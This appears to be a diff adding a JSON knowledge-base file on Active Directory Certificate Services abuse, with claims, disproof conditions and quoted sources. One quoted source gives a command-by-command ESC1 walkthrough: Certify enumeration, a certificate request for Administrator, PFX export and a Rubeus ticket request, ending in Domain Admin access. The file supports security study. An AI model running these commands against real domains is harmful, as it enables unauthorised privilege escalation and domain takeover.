@@ -1,0 +1,96 @@
+{
+ "class_id": "adcs_abuse",
+ "items": [
+  {
+   "item_key": "adcs_abuse.test.tested_page_2573581c_688f_4303_bd03_f07f0",
+   "kind": "test",
+   "claim": "Issuance authorization for AD CS lives entirely on the CA side - the enrolment decision is a check that the certificate template exists and that the requester is allowed to enrol to it - so template and enrol-permission hunting decides whether any certificate abuse is possible.",
+   "body": "Issuance authorization for AD CS lives entirely on the CA side - the enrolment decision is a check that the certificate template exists and that the requester is allowed to enrol to it - so template and enrol-permission hunting decides whether any certificate abuse is possible.\n\nHackTricks reference: 2573581c (notion:2573581c-688f-4303-bd03-f07f07b81a32)",
+   "disproof": "The CA refuses enrolment regardless of template permissions (or the requester is already entitled with no escalation gained), showing no exploitable enrolment condition exists.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#2573581c-688f-4303-bd03-f07f07b81a32",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "page 2573581c-688f-4303-bd03-f07f07b81a32\n\nLet\u2019s Discusses how the process of Requesting Certificate Occurs\n\n1) Client Generate Public/Private Key pair\n\nUntitled\n\n2) Client Sends a Certificate Request to Enterprise CA Server\n\nUntitled\n\n3) The CA Servers validate is the Certificate Template exist and is the user allowed to enroll to this cert\n\nUntitled\n\n4) CA Generates a Certificate and signs it using Private Key\n\nUntitled\n\n5) The User Stores the Certificate In the Windows Certificate Store\n\nUntitled\n\nWhat Attacker Can do if we Abused ADCS?"
+    },
+    {
+     "url": "https://attack.mitre.org/techniques/T1649/",
+     "source_type": "research",
+     "host": "attack.mitre.org",
+     "publisher": "mitre.org",
+     "quote": "For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts."
+    },
+    {
+     "url": "https://www.nccgroup.com/research/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/",
+     "source_type": "research",
+     "host": "www.nccgroup.com",
+     "publisher": "nccgroup.com",
+     "quote": "A key vulnerability arises because not all of the AD CS web interfaces enforce HTTPS, which is essential for safeguarding against NTLM relay attacks."
+    },
+    {
+     "url": "https://www.nccgroup.com/research/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/",
+     "source_type": "research",
+     "host": "nccgroup.com",
+     "publisher": "nccgroup.com",
+     "quote": "A key vulnerability arises because not all of the AD CS web interfaces enforce HTTPS, which is essential for safeguarding against NTLM relay attacks."
+    }
+   ]
+  },
+  {
+   "item_key": "adcs_abuse.technique.tested_the_enrollee_can_request_a_certifi",
+   "kind": "technique",
+   "claim": "An AD CS certificate template where Enrollee Supplies Subject is set lets a low-privileged enrollee request a certificate whose subject is any user including Domain Admins, and that certificate can then be used to obtain a Kerberos TGT as that user.",
+   "body": "An AD CS certificate template where Enrollee Supplies Subject is set lets a low-privileged enrollee request a certificate whose subject is any user including Domain Admins, and that certificate can then be used to obtain a Kerberos TGT as that user.\n\nHackTricks reference: 2573581c (notion:2573581c-688f-4303-bd03-f07f07b81a32)",
+   "disproof": "No CA in the domain exposes a template with Enrollee Supplies Subject, or the CA strips/fixes the requested subject rather than honouring the enrollee-supplied one.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#2573581c-688f-4303-bd03-f07f07b81a32",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "The Enrollee can request a certificate for any user Including Domain Admins (Enrollee Supply Subject) Subject \u2014> User\n\nNow Let\u2019s Practically Abuse ESC1\n\n1) Getting All the CAs in the domain\n\n.\\Certify.exe cas\n\nUntitled\n\n2) Finding the Vulnerable CAs in the domain\n\n.\\Certify.exe find /vulnerable\n\nUntitled\n\n3) Let\u2019s Find the CAs that have Enrollee Supplies Subject\n\n.\\Certify.exe find /enrolleesuppliessubject\n\nUntitled\n\nNotice that we have the user US\\pawadmin so we can request Certificate as any user including Domain Admins users\n\nNow let\u2019s abuse the CA\n\nRubeus.exe asktgt /user:pawadmin /domain:us.techcorp.local /certificate:C:\\AD\\Tools\\Old_Tools\\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt\n\nUntitled\n\nNow we have a ticket as pawadmin\n\nNow let\u2019s abuse the cert\n\nC:\\AD\\Tools\\Certify.exe request /ca:Techcorp-DC.techcorp.local\\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator\n\nUntitled\n\nNow getting a PFX file\n\nC:\\AD\\Tools\\openssl\\openssl.exe pkcs12 -in C:\\AD\\Tools\\cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out C:\\AD\\Tools\\DA.pfx\n\nUntitled\n\nNow getting Domain Admin User\n\nC:\\AD\\Tools\\Rubeus.exe asktgt /user:Administrator /certificate:C:\\AD\\Tools\\DA.pfx /password:SecretPass@123 /nowrap /ptt\n\nUntitled\n\nNow Domain Admin\n\nwinrs -r:us-dc set username\n\nUntitled"
+    },
+    {
+     "url": "https://attack.mitre.org/techniques/T1649/",
+     "source_type": "research",
+     "host": "attack.mitre.org",
+     "publisher": "mitre.org",
+     "quote": "For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts."
+    },
+    {
+     "url": "https://www.nccgroup.com/research/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/",
+     "source_type": "research",
+     "host": "www.nccgroup.com",
+     "publisher": "nccgroup.com",
+     "quote": "A key vulnerability arises because not all of the AD CS web interfaces enforce HTTPS, which is essential for safeguarding against NTLM relay attacks."
+    },
+    {
+     "url": "https://www.nccgroup.com/research/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/",
+     "source_type": "research",
+     "host": "nccgroup.com",
+     "publisher": "nccgroup.com",
+     "quote": "A key vulnerability arises because not all of the AD CS web interfaces enforce HTTPS, which is essential for safeguarding against NTLM relay attacks."
+    }
+   ]
+  }
+ ],
+ "publishers": [
+  "mitre.org",
+  "nccgroup.com",
+  "source-guide"
+ ],
+ "sources": [
+  "https://tested-corleggy-562.notion.site/?pvs=4#2573581c-688f-4303-bd03-f07f07b81a32",
+  "https://attack.mitre.org/techniques/T1649/",
+  "https://www.nccgroup.com/research/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/",
+  "https://www.nccgroup.com/research/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/",
+  "https://tested-corleggy-562.notion.site/?pvs=4#2573581c-688f-4303-bd03-f07f07b81a32",
+  "https://attack.mitre.org/techniques/T1649/",
+  "https://www.nccgroup.com/research/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/",
+  "https://www.nccgroup.com/research/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/"
+ ]
+}
